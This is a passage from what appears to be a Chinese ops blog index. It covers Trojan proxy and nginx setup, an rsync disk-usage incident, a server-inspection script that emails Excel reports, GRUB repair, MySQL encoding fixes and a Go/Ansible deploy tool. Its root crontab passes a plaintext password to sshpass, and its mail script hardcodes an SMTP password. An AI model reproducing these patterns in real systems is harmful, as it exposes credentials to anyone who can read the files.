\u0026quot;username\u0026quot;: \u0026quot;trojan\u0026quot;, \u0026quot;password\u0026quot;: \u0026quot;\u0026quot; } } $ ./trojan -c config.json \u0026amp; nginx配置\n主要修改的已经在注释里面写清楚了.\nserver { listen 127.0.0.1:80 default_server; # `server_name`的值`www.fenghong.tech`改为你自己的域名； server_name www.fenghong.tech; ## 后面这个是我的blog, 如果没有, 可以反向代理到任意没有敏感信息的网站即可. error_page 404 /404.html; root /www; access_log /var/log/nginx/access_www.log main; error_log /var/log/nginx/error_www.log ; location ~ /api/v1/ { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080$request_uri; proxy_cookie_path ~(.*) /; } location /lottery { root /app/js; } location /wallpaper { auth_basic \u0026quot;Please input password\u0026quot;; #这里是验证时的提示信息 auth_basic_user_file /etc/nginx/passwd; root /www; autoindex on; # 开启目录文件列表 autoindex_exact_size on; # 显示出文件的确切大小，单位是bytes autoindex_localtime on; # 显示的文件时间为文件的服务器时间 } } server { listen 127.0.0.1:80; ## server_name的值8.12.22.32改为你自己的IP； server_name 8.12.22.32; ## `www.fenghong.tech`改为你自己的域名； return 301 https://www.fenghong.tech$request_uri; } server { listen 80; server_name _; return 301 https://$host$request_uri; } 这里解释一下三个nginx虚拟主机的作用:\n第一个server接收来自Trojan的流量，与上面Trojan配置文件对应； 第二个server也是接收来自Trojan的流量，但是这个流量尝试使用IP而不是域名访问服务器， 所以将其认为是异常流量，并重定向到域名； 第三个server接收除127.0.0.1:80外的所有80端口的流量并重定向到443端口， 这样便开启了全站https，可有效的防止恶意探测。 注意到，第一个和第二个server对应综述部分原理图中的蓝色数据流， 第三个server对应综述部分原理图中的红色数据流， 综述部分原理图中的绿色数据流不会流到Nginx。 如果你本机已经有Nginx服务，那么Nginx配置文件需要做适当修改以和现有服务兼容。\n在原服务与Trojan使用同一个域名且原来是监听443端口的情况下， 那么需要将你的ssl配置删除并将监听地址改为第一个server监听的地址127.0.0.1:80， 然后直接用修改好的server代替上述配置文件中第一个server即可。 这样https加密部分将会由Trojan处理之后转发给Nginx而不是由Nginx处理 原来的服务对于客户端来说就没有变化。 如果原来的服务与Trojan使用不同的域名，建议是修改Trojan与原来的服务使用同一个域名， 如果非要使用不同的域名，那么请自己琢磨Nginx的sni， 参考连接：[ngx_stream_ssl_preread_module] (https://nginx.org/en/docs/stream/ngx_stream_ssl_preread_module.html)。 如果原来的服务是监听80端口，想要继续监听80端口那么直接去除第三个server即可， 如果要改为监听443端口参考第1点。 Windows或Mac客户端部署 几点说明，目前客户端Trojan不能使用全局代理，所以需要配合其他软件使用，比如proxifier等。推荐使用Trojan+Chrome插件SwitchyOmega实现只能Chrome的目的。\n这样Trojan只用监听一个端口，由Chrome插件决定当前流量是否走代理。如果你有别的用途可以单独在某个软件内部使用SOCKS5协议指定代理，地址为Trojan的监听地址：127.0.0.1:1080。\n配置Windows客户端 Windows客户端下载地址Trojan for Windows，打开之后下载最新版本的win.zip压缩包。\n下载成功之后解压，修改目录中的config.json配置文件中的local_port、remote_addr和password即可。其中，remote_addr填写自己的域名，local_port开启本地端口，\n用来接收本地数据，建议修改为不常用端口，否则容易冲突，本文仅使用默认端口1080演示。Trojan不需要安装就可以直接运行，拷贝Trojan文件夹到电脑里面，双击即可运行。\n如果启动报错，那么说明你的系统里面没有C++运行环境，需要安装VC++运行环境（1.12.3及以前版本安装x86环境，1.13.0及以后版本安装x64环境，或者两个版本都安装也行），\n然后重新启动Trojan，确认Trojan没有报错即可。如果启动Trojan会一闪而过，那么应该是你配置文件有错误，请仔细检查。可以使用控制台运行Trojan，能看到具体是哪一行有错.\n配置Mac客户端 Mac客户端下载地址Trojan for Mac，打开之后下载最新版的macos.zip，编辑配置文件同Windows客户端，编辑好配置文件后双击运行start.command即可。如果出\n现bind: Permission denied错误，需要在终端使用killall trojan命令杀掉现有的Trojan相关的进程。如果出现fatal: config.json(n): invalid code sequence错误，\n那么是你的配置文件第n行有错误，请检查。\n安装SwitchyOmega 不会翻墙，下面有下载链接：走你\n还有个百度经验：度娘知道\n安装好SwitchyOmega后, 可以一键导入配置\nhttp://www.fenghong.tech/OmegaOptions.bak 至此客户端Trojan已经配置完成，尽情享受吧！！！\nTrajon新客户端Trojan-Qt5 Trojan-Qt5是一个专为trojan开发的跨平台的GUI客户端，目前支持Windows、Linux、Mac。软件下载地址：Trojan-Qt5. 以windows为例, 安装完成启动后. 点击菜单栏的：连接》添加》手动。\n在弹出的窗口中按照如下的内容填写（其他选项若不懂请保持默认）：\n 配置名称 : 服务器节点的名称，随便填写； 服务器地址： 填写服务器域名； 密钥： 填入你配置trojan时设置的密码，若安装了Trojan-Panel，则填写用户名和密码，使用英文冒号分隔； 自动化： 勾选后会在程序启动时自动连接该节点，即将当前节点作为默认节点，可按需修改。  修改完参数之后，点击OK完成服务器节点的添加。另外托盘区有两个地方需要求改，如下图所示。另外还可以在设置》常规设置里面配置开机自启。\n配置完成后, 可以使用工具栏快捷方式管理节点了，包括连接、断开连接、测速等。点击连接，如果节点信息没有输入错误且软件未报错的情况下，此时已经可以使用任意浏览器访问google了。\n参考  TROJAN搭建与BBR魔改开启 自建梯子教程 \u0026ndash;Trojan版本  ","permalink":"https://www.fenghong.tech/blog/ops/trojan-install/","tags":["trojan","ss","nginx","ssl","acme","chrome"],"title":"搭建trojan服务"},{"categories":["server","ops"],"contents":"[TOC]\n 背景： 每天四次服务器磁盘巡检，一切正常， 突然到晚上十点的时候， 阿里云磁盘报警， 超过85%用量， 很纳闷， 查找并发现问题的过程， 记录下来。\n 说明  # 开头的行表示注释 \u0026gt; 开头的行表示需要在 mysql 中执行 $ 开头的行表示需要执行的命令  本文档适用于有一定web运维经验的管理员或者工程师，文中不会对安装的软件做过多的解释 解决方法及过程 报警如下:\n发现磁盘是在下午16:46开始增长的。 到晚上22:42才发出报警, 这里在负载上面也达到了恐怖的60+。\n磁盘读写情况:\n登录服务器后, 先查看磁盘用量, 初步怀疑是日志异常增加导致的.\n$ df -h $ cd /data/prod-logs $ du -sh * 111M\tadcom 34M\tc 773M\tcard 1.3G\tcard20191125bak 396M\tcard2-20191125bak 23M\tcdxb 327M\tconsul 195G\te-mall 17G\te-mall2 300M\te-mall3 140M\tfotoup 838M\thudong 73M\tjuncafe 18G\tjunzaoan 44G\tnginx 1.2G\tnode-log 3.3G\ttask 30M\tweihou 6.9G\typl [root@yunwei prod-logs]# du -sh 288G\t. # 查看同步进程, 发现rsync同步出现大量进程 $ ps aux |grep rsync | wc -l 10 $ ps aux |grep rsync root 955 14.7 0.0 108888 2436 ? Ds 11:21 0:01 rsync --server -vlogDtprze.iLs . /data/prod-logs/task/ root 962 14.0 0.0 108868 2524 ? Rs 11:21 0:00 rsync --server -vlogDtprze.iLs . /data/prod-logs/node-log/118/ root 1051 0.0 0.0 108608 260 ? S 11:21 0:00 rsync --server -vlogDtprze.iLs . /data/prod-logs/task/ root 1059 0.0 0.0 108608 208 ? S 11:21 0:00 rsync --server -vlogDtprze.iLs . /data/prod-logs/node-log/118/ ... $ find ./ -name \u0026quot;\\.*\u0026quot; -size +10M -type f | xargs ls -lh 找到了异常文件的所在位置. 一开始很纳闷, 这些临时文件是怎么产生的. google之后, 找到答案rsync原理和工作流程分析\n 当α主机发现是匹配数据块时，将只发送这个匹配块的附加信息给β主机。同时，如果两个匹配数据块之间有非匹配数据，则还会发送这些非匹配数据。当β主机陆陆续续收到这些数据后，会创建一个临时文件，并通过这些数据重组这个临时文件，使其内容和A文件相同。临时文件重组完成后，修改该临时文件的属性信息(如权限、所有者、mtime等)，然后重命名该临时文件替换掉B文件，这样B文件就和A文件保持了同步。\n 服务器上每三分钟同步一次日志. 多台服务器同步日志到192.168.0.21上.\n#*/3 * * * * sshpass -p '123456' rsync -avz -e 'ssh -p 33021' /usr/local/card/logs/ root@192.168.0.21:/data/prod-logs/card/ */3 * * * * sshpass -p '123456' rsync -avz -e 'ssh -p 33021' /usr/local/photoup-server/logs/ root@192.168.0.21:/data/prod-logs/fotoup/ #*/3 * * * * sshpass -p '123456' rsync -avz -e 'ssh -p 33021' /usr/local/card/logs/ root@192.168.0.21:/data/prod-logs/card/ #*/3 * * * * sshpass -p '123456' rsync -avz -e 'ssh -p 33021' /usr/local/juncafe/logs/ root@192.168.0.21:/data/prod-logs/juncafe/ */10 * * * * sshpass -p '123456' rsync -avz -e 'ssh -p 33021' /root/.pm2/logs/ root@192.168.0.21:/data/prod-logs/node-log/123/ */3 * * * * sshpass -p '123456' rsync -avz -e 'ssh -p 33021' /usr/local/nginx/log/*.gz root@192.168.0.21:/data/prod-logs/nginx/123/ ## 每天三次巡检 0 1,9,12,18 * * * /bin/sh /data/louis/manage.sh 如果出现了大日志文件同步(比如5G以上的文件), 建议做分隔, 不然每3分钟同步, 会导致这样的问题: 3分钟时间, rsync还没有同步完新增文件, 服务器又开始新增同步文件, 导致无限循环. 服务器压力会持续增大, 最终导致服务器负载异常, 从而宕机.\n从源头上切割大文件日志, 然后日志同步时间增加, 比如3分钟同步改成5分钟或者十分钟, 可以暂时缓解这个问题.\n结论 1.对大日志文件的管理, 必须每日进行切分. 防止此类事故再次发生(如使用logrotate管理).\n$ cat /etc/logrotate.d/tomcat-daka /usr/local/apache-tomcat-daka/logs/catalina.out { daily rotate 15 missingok dateext compress notifempty copytruncate } 2.增加服务器负载到达10或者cpu到100%的报警通知, 此次告警为磁盘告警才被通知到. 加快处理响应时间.\n","permalink":"https://www.fenghong.tech/blog/ops/rsync-with-big-file/","tags":["rsync","logs"],"title":"rsync大文件传输导致磁盘异常爆增"},{"categories":["Python"],"contents":"背景  接到一个需求, 要求每天都要服务器巡检, 并统计巡检信息, 归档备查. 公司服务器有13台, 一台台巡查, 手动操作又很繁琐, 身为运维, 决不能让重复性劳动占据太多时间.\n 解决思路  写一个监控脚本, 监控服务器的所有的状态, 如服务器磁盘, CPU, 内存, IP, 主机名, load等. 将监控的服务器状态转为文本. 将文本内容转化为Excel. 将Excel发送相关人员邮箱.  想到就要干, 开始写脚本\n项目结构\n. ├── a.sh #服务器巡检脚本 ├── manage.log #服务器执行脚本日志 ├── manage.sh\t#总执行脚本 ├── py3\t#python3 虚拟环境 ├── __pycache__\t#python3编译生成的cache文件夹 ├── server-monitor #xls文件归档目录 └── transformation.py #python脚本 shell巡检脚本 $ cat \u0026gt; a.sh \u0026lt;\u0026lt;-eof #!/usr/bin/env bash #获取主机名 system_hostname=$(hostname | awk '{print $1}') #获取服务器IP system_ip=$(curl http://100.100.100.200/latest/meta-data/private-ipv4) #获取总内存 mem_total=$(free -m | grep Mem| awk -F \u0026quot; \u0026quot; '{print $2}') #获取剩余内存 mem_free=$(free -m | grep \u0026quot;Mem\u0026quot; | awk '{print $4+$6}') #获取已用内存 mem_use=$(free -m | grep Mem| awk -F \u0026quot; \u0026quot; '{print $3}') #获取当前平均一分钟负载 load_1=`top -n 1 -b | grep average | awk -F ':' '{print $5}' | sed -e 's/\\,//g' | awk -F \u0026quot; \u0026quot; '{print $1}'` #获取当前平均五分钟负载 load_5=`top -n 1 -b | grep average | awk -F ':' '{print $5}' | sed -e 's/\\,//g' | awk -F \u0026quot; \u0026quot; '{print $2}'` #获取当前平均十五分钟负载 load_15=`top -n 1 -b | grep average | awk -F ':' '{print $5}' | sed -e 's/\\,//g' | awk -F \u0026quot; \u0026quot; '{print $3}'` #取磁盘信息，并加入描述 disk_1=$(df -Ph |grep -v overlay|grep -v grep| awk '{if(+$5\u0026gt;2) print \u0026quot;分区:\u0026quot;$1,\u0026quot;总空间:\u0026quot;$2,\u0026quot;使用空间:\u0026quot;$3,\u0026quot;剩余空间:\u0026quot;$4,\u0026quot;磁盘使用率:\u0026quot;$5}') #拆分 disk_fq=$(df -Ph|grep -v overlay|grep -v grep | awk '{if(+$5\u0026gt;2) print \u0026quot;分区:\u0026quot;$1}') disk_to=$(df -Ph|grep -v overlay|grep -v grep | awk '{if(+$5\u0026gt;2) print \u0026quot;总空间:\u0026quot;$2}') disk_us=$(df -Ph|grep -v overlay|grep -v grep | awk '{if(+$5\u0026gt;2) print \u0026quot;使用空间:\u0026quot;$3}') disk_fe=$(df -Ph|grep -v overlay|grep -v grep | awk '{if(+$5\u0026gt;2) print \u0026quot;剩余空间:\u0026quot;$4}') disk_ul=$(df -Ph|grep -v overlay|grep -v grep | awk '{if(+$5\u0026gt;2) print \u0026quot;磁盘使用率:\u0026quot;$5}') disk_ux=$(df -Ph|grep -v overlay|grep -v grep | awk '{if(+$5\u0026gt;2) print $5}') #信息存放的文件路径 [ -d \u0026quot;/tmp/sftp/log\u0026quot; ] || mkdir /tmp/sftp/log -p path=/tmp/sftp/log/monitor_\u0026quot;$system_ip\u0026quot;.txt #内存阈值 mem_mo='60' echo -e \u0026quot; \u0026quot; \u0026gt; $path echo -e \u0026quot;主机名:\u0026quot;$system_hostname \u0026gt;\u0026gt; $path echo -e \u0026quot;服务器IP:\u0026quot;$system_ip \u0026gt;\u0026gt; $path if [[ $(echo $disk_ux | sed s/%//g) -gt 50 ]] then echo $disk_fq \u0026gt;\u0026gt;$path echo $disk_to \u0026gt;\u0026gt;$path echo $disk_us \u0026gt;\u0026gt;$path echo $disk_fe \u0026gt;\u0026gt;$path echo $disk_ul \u0026gt;\u0026gt;$path echo 磁盘巡检状态:不正常 \u0026gt;\u0026gt;$path else echo $disk_fq \u0026gt;\u0026gt;$path echo $disk_to \u0026gt;\u0026gt;$path echo $disk_us \u0026gt;\u0026gt;$path echo $disk_fe \u0026gt;\u0026gt;$path echo $disk_ul \u0026gt;\u0026gt;$path echo 磁盘巡检状态:正常 \u0026gt;\u0026gt;$path fi PERCENT=$(printf \u0026quot;%d%%\u0026quot; $(($mem_use*100/$mem_total))) PERCENT_1=$(echo $PERCENT|sed 's/%//g') if [[ $PERCENT_1 -gt $mem_mo ]] then echo -e 总内存大小:$mem_total MB\u0026gt;\u0026gt; $path echo -e 已用内存:$mem_use MB \u0026gt;\u0026gt; $path echo -e 内存剩余大小:$mem_free MB \u0026gt;\u0026gt; $path echo -e 内存使用率:$PERCENT \u0026gt;\u0026gt; $path echo -e 内存巡检结果:不正常 \u0026gt;\u0026gt; $path else echo -e 总内存大小:$mem_total MB\u0026gt;\u0026gt; $path echo -e 已用内存:$mem_use MB \u0026gt;\u0026gt; $path echo -e 内存剩余大小:$mem_free MB \u0026gt;\u0026gt; $path echo -e 内存使用率:$PERCENT \u0026gt;\u0026gt; $path echo 内存巡检结果:正常 \u0026gt;\u0026gt; $path fi echo -e 平均1分钟负载:$load_1\u0026quot;\\n\u0026quot;平均5分钟负载:$load_5\u0026quot;\\n\u0026quot;平均15分钟:$load_15 \u0026gt;\u0026gt; $path 执行脚本\n$ sh a.sh $ cat /tmp/sftp/log/monitor_172.16.111.118.txt 主机名:iZbp167av7wvow0nqs68rlZ 服务器IP:172.16.111.118 分区:/dev/vda1 总空间:296G 使用空间:78G 剩余空间:204G 磁盘使用率:28% 磁盘巡检状态:正常 总内存大小:16081 MB 已用内存:15806 MB 内存剩余大小:882 MB 内存使用率:98% 内存巡检结果:不正常 平均1分钟负载:1.08 平均5分钟负载:1.08 平均15分钟:1.01 python将文本txt转为Excel $ cat transformation.py #!/usr/bin/python # -*- coding: UTF-8 -*- import xlwt import datetime #import sendmail import smtplib from email.mime.text import MIMEText from email.mime.multipart import MIMEMultipart from email.header import Header #每天的几点发送邮件及附件加时间戳 now = datetime.datetime.now().strftime(\u0026#39;%Y-%m-%d-%H\u0026#39;) mail_host=\u0026#34;smtp.mxhichina.com\u0026#34; #设置服务器 mail_user=\u0026#34;louis@wangke.co\u0026#34; #用户名 mail_pass=\u0026#34;123456\u0026#34; #口令 style = \u0026#34;font:colour_index red; align: wrap on, vert centre, horiz center;\u0026#34; styleb = xlwt.XFStyle() # 创建一个样式对象，初始化样式 al = xlwt.Alignment() al.horz = 0x02 # 设置水平居中 al.vert = 0x01 # 设置垂直居中 styleb.alignment = al red_style = xlwt.easyxf(style) title_style = xlwt.easyxf(\u0026#39;font: height 200, name Arial Black, colour_index blue, bold on; align: wrap on, vert centre, horiz center;\u0026#39; ) def getlist(): # 读取txt with open(\u0026#39;hebing.txt\u0026#39;, \u0026#39;r+\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;) as f: s1 = f.readlines() f.close() s2 = [] for i in s1: if \u0026#39;\\n\u0026#39; in i: s2.append(i[:-1]) else: s2.append(i) return s2 def fenge(): # 分割 list0 = [] # 存贮空格行 for num, val0 in enumerate(getlist()): if val0.split(\u0026#39;:\u0026#39;)[0] == \u0026#39;主机名\u0026#39;: list0.append(num) list0.append(len(getlist())) list1 = [] # 存贮内容 for num1,val1 in enumerate(list0[1:]): temp = getlist()[list0[num1]:list0[num1+1]] list1.append(temp) return list1 def wxls(): # 写入表格 title = [\u0026#39;主机名\u0026#39;,\u0026#39;服务器IP\u0026#39;,\u0026#39;分区\u0026#39;,\u0026#39;总空间\u0026#39;,\u0026#39;使用空间\u0026#39;,\u0026#39;剩余空间\u0026#39;,\u0026#39;磁盘使用率\u0026#39;,\u0026#39;磁盘巡检状态\u0026#39;,\u0026#39;总内存大小\u0026#39;, \u0026#39;已用内存\u0026#39;,\u0026#39;内存剩余大小\u0026#39;,\u0026#39;内存使用率\u0026#39;,\u0026#39;内存巡检结果\u0026#39;,\u0026#39;平均1分钟负载\u0026#39;,\u0026#39;平均5分钟负载\u0026#39;,\u0026#39;平均15分钟\u0026#39;, \u0026#39;ceshi\u0026#39;] workbook = xlwt.Workbook(encoding=\u0026#39;utf-8\u0026#39;) worksheet = workbook.add_sheet(\u0026#39;sheet1\u0026#39;) for i1, val in enumerate(title): worksheet.write(0, i1, label=val,style = title_style) first_col = worksheet.col(i1) first_col.width = 180 * 20 for i2, val2 in enumerate(title): for i3, val3 in enumerate(fenge()): for j in val3: if j.split(\u0026#39;:\u0026#39;)[0] == val2: #print i2,i3,j.split(\u0026#39;:\u0026#39;)[1].decode(\u0026#39;utf8\u0026#39;) if j.split(\u0026#39;:\u0026#39;)[1] == \u0026#39;不正常\u0026#39;: worksheet.write(i3 + 1, i2, label=j.split(\u0026#39;:\u0026#39;)[1],style=red_style) else: worksheet.write(i3+1, i2, label=j.split(\u0026#39;:\u0026#39;)[1] ,style = styleb) name = now + \u0026#39;miontior.xls\u0026#39; workbook.save(name) def send_mail(): sender = \u0026#39;louis@wangke.co\u0026#39; receivers = [\u0026#39;louis@wangke.co\u0026#39;] # 接收邮件，可设置为你的QQ邮箱或者其他邮箱 #创建一个带附件的实例 message = MIMEMultipart() message[\u0026#39;From\u0026#39;] = Header(\u0026#34;louis@wangke.co\u0026#34;, \u0026#39;utf-8\u0026#39;) message[\u0026#39;To\u0026#39;] = Header(\u0026#34;louis@wangke.co\u0026#34;, \u0026#39;utf-8\u0026#39;) subject = now+\u0026#39;服务器巡检表格\u0026#39; message[\u0026#39;Subject\u0026#39;] = Header(subject, \u0026#39;utf-8\u0026#39;) #邮件正文内容 message.attach(MIMEText(\u0026#39;各位好: \\n\u0026#39; + now + \u0026#39;: 生产环境各服务器状态见附件.\u0026#39;, \u0026#39;plain\u0026#39;, \u0026#39;utf-8\u0026#39;)) # 构造附件1，传送当前目录下的 test.txt 文件 att1 = MIMEText(open(now + \u0026#39;miontior.xls\u0026#39;, \u0026#39;rb\u0026#39;).read(), \u0026#39;base64\u0026#39;, \u0026#39;utf-8\u0026#39;) att1[\u0026#34;Content-Type\u0026#34;] = \u0026#39;application/octet-stream\u0026#39; # 这里的filename可以任意写，写什么名字，邮件中显示什么名字 att1[\u0026#34;Content-Disposition\u0026#34;] = \u0026#39;attachment; filename=\u0026#34;{}moniter.xls\u0026#34;\u0026#39;.format(now+\u0026#39;-\u0026#39;) message.attach(att1) try: smtpObj = smtplib.SMTP_SSL(mail_host, 465) smtpObj.login(mail_user,mail_pass) smtpObj.sendmail(sender, receivers, message.as_string()) print (\u0026#34;邮件发送成功\u0026#34;) except smtplib.SMTPException: print (\u0026#34;Error: 无法发送邮件\u0026#34;) wxls() send_mail() 批量操作 上面的都是单机操作, 单机操作其实没必要写脚本了, 手动也花不了多少时间. 万一服务器有100台呢? 每台执行相同的命令, 依旧没有解决问题. 这里, 可以将监控的文本txt全部fecth到某台服务器进行集中管理, 即可解决痛点. 使用的是anisible进行管理的主机\n$ cat manage.sh #!/bin/bash DATE=$(date +%F-%H:%M:%S) source py3/bin/activate echo \u0026#34;$DATEexec $0\u0026#34; \u0026gt;\u0026gt; manage.log ## 所有主机执行a.sh, 即完成服务器巡检操作 ansible all -m script -a \u0026#34;/data/louis/a.sh\u0026#34; \u0026gt;\u0026gt; manage.log ## 将所有主机的生成的txt文件同步到ansible管理的主机上 ansible all -m synchronize -a \u0026#34;src=/tmp/sftp/log/ dest=/data/louis mode=pull\u0026#34; \u0026gt;\u0026gt; manage.log ## 生成主机合并的信息文件 \u0026gt; hebing.txt ## 遍历同步过来的主机巡检信息文件, 追加至文件 for file in `ls ./mo*.txt` ; do cat $file \u0026gt;\u0026gt; hebing.txt done ## 将合并的信息转为xls文件 python3.4 transformation.py \u0026gt;\u0026gt; manage.log ## 将不需要的文件删掉并归档. rm -f *.txt mv *.xls server-monitor 关于ansible的细节操作就不在重复了, 具体细节点击标签, 查看ansible相关文档.\nover~\n","permalink":"https://www.fenghong.tech/blog/python/python-with-excel/","tags":["Python","shell","ansible"],"title":"服务器巡检并汇总Excel发送邮件通知"},{"categories":["ops"],"contents":" 周末公司整座大楼停电, 所有物理机全部关机然后等待来电启动, 其中一台linux系统启动报错如下:\nReboot and Select proper Boot device\nor Insert Boot Media in selected Boot device and press a key.\n 解决思路 百度了一阵, 大概意思是, 重新启动, 选择一个正确的引导设备或者插入媒体引导设备. 第一想法就是引导失效, grub阶段都进入不了.\nGRUB共分为三个阶段： stage1主要负责BIOS和GRUB之间的交接，载入存放于各个分区中的开机文件； stage1.5是连接stage1和stage2之间的通道，起着过渡的作用，负责识别stage2所在/boot分区的文件系统，以便进入stage2； stage2是grub的核心部分，在这个阶段完成加载内核、加载根文件系统驱动、挂载根等工作。 内核启动修复前, 看一下grub.conf文件\n# grub.conf generated by anaconda # # Note that you do not have to rerun grub after making changes to this file # NOTICE: You have a /boot partition. This means that # all kernel and initrd paths are relative to /boot/, eg. # root (hd0,1) # kernel /vmlinuz-version ro root=/dev/mapper/VolGroup-lv_root # initrd /initrd-[generic-]version.img #boot=/dev/sda1 device (hd0) HD(1,800,64000,90dc22cc-792a-41d5-acf4-4225d09ce704) default=0 timeout=5 splashimage=(hd0,1)/grub/splash.xpm.gz hiddenmenu title CentOS (2.6.32-431.el6.x86_64) root (hd0,1) kernel /vmlinuz-2.6.32-431.el6.x86_64 ro root=/dev/mapper/VolGroup-lv_root rd_NO_LUKS rd_NO_MD rd_LVM_LV=VolGroup/lv_swap crashkernel=128M LANG=zh_CN.UTF-8 rd_LVM_LV=VolGroup/lv_root KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet initrd /initramfs-2.6.32-431.el6.x86_64.img 我们这边主要是stage1方式缺失. 需要采用新的光盘引导进入resuce 救援模式\nResuce installed system 选择完Resuce后, 静待1分钟, 会有一个交互式选择\n在询问是否同意将系统挂载到/mnt/sysimage，选择continue即可, 默认为1 选择enter即可进入shell. 进入恢复, 查看系统安装位置, 目前我们的系统安装在/dev/sda1\nsh-4.1# chroot /mnt/sysimage bash-4.1# lsblk bash-4.1# grub-install /dev/sda1 # 修复grub，此过程stage[1,1.5,2]都可以修复, 此步骤容易出现故障 bash-4.1# sync # 同步设置到磁盘，确保磁盘已经写入进去了 # 此时不仅修复了mbr还修复了grub里面不同stage的文件 查看grub文件是否存在, 发现grub.conf文件也不存在. 将备份的conf复制过来\nbash-4.1# cat /boot/grub/grub.conf cat: /boot/grub/grub.conf: No such file or directory bash-4.1# cp /etc/grub.conf /boot/grub/grub.conf 查看/boot/efi文件, 文件也丢失了\nbash-4.1# ls /boot/efi/EFI/centos/ bash-4.1# cp /etc/grub.conf /boot/efi/EFI/centos/ bash-4.1# reboot ","permalink":"https://www.fenghong.tech/blog/ops/linux-grub-bios/","tags":["grub","secure","linux"],"title":"记一次linux的bios引导失败"},{"categories":["mysql"],"contents":"[TOC]\n # 开头的行表示注释 \u0026gt; 开头的行表示需要在 mysql 中执行 $ 开头的行表示需要执行的命令   背景: 生产环境mysql执行sql脚本, 因疏忽大意, 没检查中文编码, 导致数据里面数据中文部分乱码. 特此总结记录. 并给出解决方案\n mysql 导入中文数据乱码 先看一段sql, 里面有中文微信公众号绑定\n-- cat 2.sql INSERT INTO `base_enterprise_menu` VALUES (\u0026#39;1210077099628462080\u0026#39;, null, \u0026#39;1210077099620073472\u0026#39;, \u0026#39;merchant_mall_manager\u0026#39;, \u0026#39;WechatBind\u0026#39;, \u0026#39;微信公众号绑定\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;2-10-3-1\u0026#39;, null, \u0026#39;2019-12-26 13:57:17\u0026#39;, \u0026#39;1\u0026#39;); 直接在服务器执行, 后面获取字段的肯定就乱码了.\n$ mysql -uroot -ppassword yourdb \u0026lt; 2.sql 解决方案 使用Navicat执行sql 把文件内容复制下来, 在Navicat mysql里面执行\n使用命令行添加参数 $ mysql -uroot -ppassword yourdb \u0026lt; 2.sql --default-character-set = utf8 使用sql命令行 $ mysql -uroot -ppassword -hhost \u0026gt; use yourdb; \u0026gt; set names utf8; \u0026gt; source 2.sql; 改变sql文件的编码 $ file 2.sql 2.sql: ISO-8859 text, with CRLF line terminators $ cat 2.sql INSERT INTO `base_enterprise_menu` VALUES (\u0026#39;1210077099628462080\u0026#39;, null, \u0026#39;1210077099620073472\u0026#39;, \u0026#39;merchant_mall_manager\u0026#39;, \u0026#39;WechatBind\u0026#39;, \u0026#39;微信公众号绑定\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;2-10-3-1\u0026#39;, null, \u0026#39;2019-12-26 13:57:17\u0026#39;, \u0026#39;1\u0026#39;); $ vi 2-utf8.sql ## 将内容复制过来后, :wq保存 $ file 2-utf8.sql 2-utf8.sql: UTF-8 Unicode C program text, with CRLF line terminators ","permalink":"https://www.fenghong.tech/blog/mysql/mysql-file-coding/","tags":["mysql","coding"],"title":"mysql执行sql导入数据库中文乱码"},{"categories":["ops"],"contents":"ango 基于golang开发的一个用于部署项目至生产环境的部署工具\n目前仅使用playbook部署/回滚相关业务并使用钉钉的webhook通知, 文档查看: https://github.com/oldthreefeng/ango\nRequired  go version go1.13.4 linux/amd64 export GO111MODULE=\u0026quot;on\u0026quot; ansible2.6+ .yml is ready to go  Usage download and compile use git to download source code\n$ git clone https://github.com/oldthreefeng/ango.git $ cd ango \u0026amp;\u0026amp; go mod download # Linux $ make linux # darwin $ make darwin $ ./ango ango is cli tools to running Ansible playbooks from Golang. run \u0026#34;ango -h\u0026#34; get more help, more see https://github.com/oldthreefeng/ango ango version : 1.0.0 Git Commit Hash: a9a3c28 UTC Build Time : 2019-12-13 04:16:36 UTC Go Version: go version go1.13.4 linux/amd64 Author : louis.hong use go get\n$ go get github.com/oldthreefeng/ango run with palybook first, to config your ansible, more to see ansible\n$ vim /etc/ansible/hosts [test] 192.168.0.62 192.168.0.63 $ ansible test -m ping 192.168.0.62 | SUCCESS =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;ping\u0026#34;: \u0026#34;pong\u0026#34; } 192.168.0.63 | SUCCESS =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;ping\u0026#34;: \u0026#34;pong\u0026#34; } second, to export some env to hook to Dingding\n$ export DingDingMobiles=\u0026#34;158****6468\u0026#34; $ export DingDingUrl=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=*****\u0026#34; third, to deploy your project\n$ ango deploy -f test.yml -v v1.23 ## It\u0026#39;s equal to `ansible-playbook test.yml -e version=v1.23 -f 1` ## and to Post a test Message to Dingding $ ango deploy -h use ango to deploy project with webhook to dingding Usage: ango deploy [flags] Examples: ango deploy -f api.yml -t v1.2.0 Flags: -m, --comments string add comments when send message to dingding -h, --help help for deploy Global Flags: --author string author name for copyright attribution (default \u0026#34;louis.hong\u0026#34;) -f, --filename string ansible-playbook for yml config(requried) -t, --tags string tags for the project version(requried) -v, --verbose verbose mode to see more detail infomation fourth, to rollback your project\n$ ango rollback -f test.yml -t v1.2 --real ## rollback 回退版本, 需要指定回退版本的yml文件及要回退的version Usage: ango rollback [flags] Examples: ango rollback -f roll_api.yml -t v1.2 -r Flags: -h, --help help for rollback -r, --real really to rollback this version Global Flags: --author string author name for copyright attribution (default \u0026quot;louis.hong\u0026quot;) -f, --filename string ansible-playbook for yml config(requried) -t, --tags string tags for the project version(requried) -v, --verbose verbose mode to see more detail infomation logs # 查看发布日志 # -r is requried when rollback $ ango rollback -f test.yml -t v1.2.0 -r $ ango deploy -f test.yml -t v1.4.0 $ tail -f fabu.log [INFO] 2019-12-12 18:36:29 test-v1.2 回滚成功 [INFO] 2019-12-12 18:37:00 test-v1.4 部署成功 实现细节 golang调用shell执行ansible-playbook, 记录操作日志,并将执行结果钉钉通知到钉钉群\n/* * Copyright (c) 2019. The ango Authors. All rights reserved. * Use of this source code is governed by a MIT-style * license that can be found in the LICENSE file. */ package cmd import ( \u0026quot;fmt\u0026quot; \u0026quot;github.com/oldthreefeng/ango/play\u0026quot; \u0026quot;os\u0026quot; \u0026quot;os/exec\u0026quot; \u0026quot;strings\u0026quot; \u0026quot;time\u0026quot; ) var ( DingDingUrl string = os.Getenv(\u0026quot;DingDingUrl\u0026quot;) AllMo string = os.Getenv(\u0026quot;DingDingMobiles\u0026quot;) ) const ( 